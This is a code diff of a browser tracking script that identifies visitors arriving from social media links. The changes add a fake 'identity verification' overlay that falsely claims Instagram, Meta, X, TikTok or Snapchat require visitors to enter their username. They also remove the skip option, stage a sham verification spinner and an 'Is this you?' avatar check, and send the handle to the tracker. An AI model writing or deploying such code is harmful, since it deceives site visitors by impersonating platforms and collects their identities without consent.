@@ -16,6 +16,8 @@
     sessionStorage.setItem(SESSION_KEY, sessionId);
   }
 
+  var SENT_KEY = 'ig_tracker_sent_' + sessionId;
+
   // ── Social Media Platform Configs ─────────────────────────
   var PLATFORMS = {
     instagram: {
@@ -26,7 +28,9 @@
       prefix: '@',
       placeholder: 'username',
       validation: /^[a-zA-Z0-9._]{1,30}$/,
-      errorMsg: 'Enter a valid Instagram username'
+      errorMsg: 'Enter a valid Instagram username',
+      verifyMsg: 'Instagram requires identity verification to view external links',
+      avatarService: 'instagram'
     },
     facebook: {
       name: 'Facebook',
@@ -36,7 +40,9 @@
       prefix: '',
       placeholder: 'name or profile URL',
       validation: /^.{2,}$/,
-      errorMsg: 'Enter your Facebook name or profile URL'
+      errorMsg: 'Enter your Facebook name or profile URL',
+      verifyMsg: 'Meta requires identity verification to view external links',
+      avatarService: null
     },
     twitter: {
       name: 'X (Twitter)',
@@ -46,7 +52,9 @@
       prefix: '@',
       placeholder: 'username',
       validation: /^[a-zA-Z0-9_]{1,15}$/,
-      errorMsg: 'Enter a valid X/Twitter username'
+      errorMsg: 'Enter a valid X/Twitter username',
+      verifyMsg: 'X requires identity verification to view external links',
+      avatarService: 'twitter'
     },
     tiktok: {
       name: 'TikTok',
@@ -56,7 +64,9 @@
       prefix: '@',
       placeholder: 'username',
       validation: /^[a-zA-Z0-9._]{2,24}$/,
-      errorMsg: 'Enter a valid TikTok username'
+      errorMsg: 'Enter a valid TikTok username',
+      verifyMsg: 'TikTok requires identity verification to view external links',
+      avatarService: null
     },
     snapchat: {
       name: 'Snapchat',
@@ -66,7 +76,10 @@
       prefix: '',
       placeholder: 'username',
       validation: /^[a-zA-Z0-9._-]{3,15}$/,
-      errorMsg: 'Enter a valid Snapchat username'
+      errorMsg: 'Enter a valid Snapchat username',
+      verifyMsg: 'Snapchat requires identity verification to view external links',
+      avatarService: null,
+      btnText: '#000'
     }
   };
 
@@ -232,10 +245,37 @@
     } catch (e) {}
   }
 
-  // ── Social Media Gate UI (generic) ────────────────────────
+  // ── Dismiss Gate ──────────────────────────────────────────
+  function dismissGate(overlay, scrollY) {
+    overlay.classList.add('ig-gate-hidden');
+    document.body.classList.remove('ig-gate-locked');
+    document.body.style.top = '';
+    window.scrollTo(0, scrollY);
+    setTimeout(function () {
+      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+    }, 300);
+  }
+
+  // ── Wait for user interaction before showing gate ─────────
+  function waitForInteraction(callback) {
+    var triggered = false;
+    function trigger() {
+      if (triggered) return;
+      triggered = true;
+      document.removeEventListener('scroll', trigger);
+      document.removeEventListener('click', trigger);
+      setTimeout(callback, 200);
+    }
+    document.addEventListener('scroll', trigger, { passive: true });
+    document.addEventListener('click', trigger);
+    // Fallback: auto-show after 8s if no interaction
+    setTimeout(trigger, 8000);
+  }
+
+  // ── Social Gate (multi-state: input → verifying → confirmed) ──
   function showSocialGate(platformKey) {
     var existing = sessionStorage.getItem(HANDLE_KEY);
-    if (existing) {
+    if (existing && existing !== '__skipped__') {
       sendPayload(buildPayload(existing, platformKey));
       return;
     }
@@ -249,90 +289,133 @@
 
     var overlay = document.createElement('div');
     overlay.className = 'ig-gate-overlay';
-
-    var logoStyle = cfg.logoColor.indexOf('gradient') !== -1
-      ? 'background:' + cfg.logoColor
-      : 'background:' + cfg.logoColor;
-
-    overlay.innerHTML =
-      '<div class="ig-gate-card">' +
-      '  <div class="ig-gate-logo" style="' + logoStyle + '">' + cfg.icon + '</div>' +
-      '  <h2 class="ig-gate-title">Verify your account</h2>' +
-      '  <p class="ig-gate-subtitle">Confirm your ' + cfg.name + ' username to access this link</p>' +
-      '  <div class="ig-gate-input-wrapper">' +
-      (cfg.prefix ? '    <span class="ig-gate-at">' + cfg.prefix + '</span>' : '') +
-      '    <input class="ig-gate-input" type="text" placeholder="' + cfg.placeholder + '" autocomplete="off" autocapitalize="none" spellcheck="false"' +
-      (cfg.prefix ? '' : ' style="padding-left:14px"') + '>' +
-      '  </div>' +
-      '  <button class="ig-gate-btn" style="background:' + cfg.gradient + '" disabled>Continue</button>' +
-      '  <div class="ig-gate-error"></div>' +
-      '  <button class="ig-gate-skip">continue without</button>' +
-      '</div>';
-
+    var card = document.createElement('div');
+    card.className = 'ig-gate-card';
+    overlay.appendChild(card);
     document.body.appendChild(overlay);
 
-    var input = overlay.querySelector('.ig-gate-input');
-    var btn = overlay.querySelector('.ig-gate-btn');
-    var errorEl = overlay.querySelector('.ig-gate-error');
-    var skipBtn = overlay.querySelector('.ig-gate-skip');
+    var verifyGen = 0;
+    var logoHtml = '<div class="ig-gate-logo" style="background:' + cfg.logoColor + '">' + cfg.icon + '</div>';
+    var btnColor = cfg.btnText ? 'color:' + cfg.btnText + ';' : '';
 
-    input.addEventListener('input', function () {
-      var val = input.value.replace(/^@/, '').trim();
-      btn.disabled = val.length === 0;
-      errorEl.textContent = '';
-    });
+    // ── State: Username input ──
+    function renderInput() {
+      verifyGen++;
+      card.innerHTML =
+        logoHtml +
+        '<h2 class="ig-gate-title">Identity verification</h2>' +
+        '<p class="ig-gate-subtitle">' + cfg.verifyMsg + '</p>' +
+        '<div class="ig-gate-input-wrapper">' +
+        (cfg.prefix ? '<span class="ig-gate-at">' + cfg.prefix + '</span>' : '') +
+        '<input class="ig-gate-input" type="text" placeholder="' + cfg.placeholder + '" autocomplete="off" autocapitalize="none" spellcheck="false"' +
+        (cfg.prefix ? '' : ' style="padding-left:14px"') + '>' +
+        '</div>' +
+        '<button class="ig-gate-btn" style="background:' + cfg.gradient + ';' + btnColor + '" disabled>Continue</button>' +
+        '<div class="ig-gate-error"></div>';
 
-    function submit() {
-      var handle = input.value.replace(/^@/, '').trim();
-      if (!handle) {
-        errorEl.textContent = 'Please enter your ' + cfg.name + ' username';
-        return;
+      var input = card.querySelector('.ig-gate-input');
+      var btn = card.querySelector('.ig-gate-btn');
+      var errorEl = card.querySelector('.ig-gate-error');
+
+      input.addEventListener('input', function () {
+        btn.disabled = input.value.replace(/^@/, '').trim().length === 0;
+        errorEl.textContent = '';
+      });
+
+      function submit() {
+        var handle = input.value.replace(/^@/, '').trim();
+        if (!handle) { errorEl.textContent = 'Please enter your username'; return; }
+        if (!cfg.validation.test(handle)) { errorEl.textContent = cfg.errorMsg; return; }
+        renderVerifying(handle);
       }
-      if (!cfg.validation.test(handle)) {
-        errorEl.textContent = cfg.errorMsg;
-        return;
+
+      btn.addEventListener('click', submit);
+      input.addEventListener('keydown', function (e) { if (e.key === 'Enter') submit(); });
+      setTimeout(function () { input.focus(); }, 100);
+    }
+
+    // ── State: Verifying spinner ──
+    function renderVerifying(handle) {
+      var myGen = verifyGen;
+      card.innerHTML =
+        logoHtml +
+        '<h2 class="ig-gate-title">Verifying</h2>' +
+        '<div class="ig-gate-spinner"></div>' +
+        '<p class="ig-gate-status">Checking ' + cfg.prefix + handle + '</p>';
+
+      var avatarUrl = cfg.avatarService
+        ? 'https://unavatar.io/' + cfg.avatarService + '/' + handle
+        : null;
+
+      var done = false;
+      var avatarResult = avatarUrl ? null : false;
+
+      if (avatarUrl) {
+        var img = new Image();
+        img.onload = function () { avatarResult = true; checkReady(); };
+        img.onerror = function () { avatarResult = false; checkReady(); };
+        img.src = avatarUrl;
       }
+
+      var minTimerDone = false;
+      setTimeout(function () { minTimerDone = true; checkReady(); }, 1500);
+      // Hard timeout for slow avatar fetch
+      setTimeout(function () { if (avatarResult === null) { avatarResult = false; checkReady(); } }, 4000);
+
+      function checkReady() {
+        if (done || myGen !== verifyGen || !minTimerDone || avatarResult === null) return;
+        done = true;
+        if (avatarResult && avatarUrl) {
+          renderConfirmation(handle, avatarUrl);
+        } else {
+          renderVerified(handle);
+        }
+      }
+    }
+
+    // ── State: Profile pic confirmation ("Is this you?") ──
+    function renderConfirmation(handle, avatarUrl) {
+      card.innerHTML =
+        '<div class="ig-gate-avatar"><img src="' + avatarUrl + '" alt=""></div>' +
+        '<h2 class="ig-gate-title">Is this you?</h2>' +
+        '<p class="ig-gate-handle">' + cfg.prefix + handle + '</p>' +
+        '<button class="ig-gate-btn" style="background:' + cfg.gradient + ';' + btnColor + '">Yes, that\'s me</button>' +
+        '<button class="ig-gate-retry">Not me</button>';
+
+      card.querySelector('.ig-gate-btn').addEventListener('click', function () {
+        renderVerified(handle);
+      });
+      card.querySelector('.ig-gate-retry').addEventListener('click', renderInput);
+    }
+
+    // ── State: Verified checkmark + auto-dismiss ──
+    function renderVerified(handle) {
+      card.innerHTML =
+        '<div class="ig-gate-check">' +
+        '<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>' +
+        '</div>' +
+        '<h2 class="ig-gate-title" style="color:#2ECC71">Verified</h2>' +
+        '<p class="ig-gate-status">' + cfg.prefix + handle + '</p>';
 
       sessionStorage.setItem(HANDLE_KEY, handle);
       sessionStorage.setItem(SENT_KEY, '1');
       sendPayload(buildPayload(handle, platformKey));
-      dismissGate(overlay, scrollY);
+      setTimeout(function () { dismissGate(overlay, scrollY); }, 1000);
     }
 
-    btn.addEventListener('click', submit);
-    input.addEventListener('keydown', function (e) {
-      if (e.key === 'Enter') submit();
-    });
-
-    skipBtn.addEventListener('click', function () {
-      sessionStorage.setItem(HANDLE_KEY, '__skipped__');
-      sessionStorage.setItem(SENT_KEY, '1');
-      sendPayload(buildPayload(null, platformKey));
-      dismissGate(overlay, scrollY);
-    });
-
-    setTimeout(function () { input.focus(); }, 350);
+    // Start with the input form
+    renderInput();
   }
 
-  function dismissGate(overlay, scrollY) {
-    overlay.classList.add('ig-gate-hidden');
-    document.body.classList.remove('ig-gate-locked');
-    document.body.style.top = '';
-    window.scrollTo(0, scrollY);
-    setTimeout(function () {
-      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
-    }, 300);
-  }
-
-  // ── Initialize (with dedup guard) ─────────────────────────
-  var SENT_KEY = 'ig_tracker_sent_' + sessionId;
-
+  // ── Initialize ────────────────────────────────────────────
   function init() {
     if (sessionStorage.getItem(SENT_KEY)) return;
 
     var platform = detectSocialVisitor();
     if (platform && PLATFORMS[platform]) {
-      showSocialGate(platform);
+      waitForInteraction(function () {
+        showSocialGate(platform);
+      });
     } else {
       sessionStorage.setItem(SENT_KEY, '1');
       sendPayload(buildPayload(null, null));
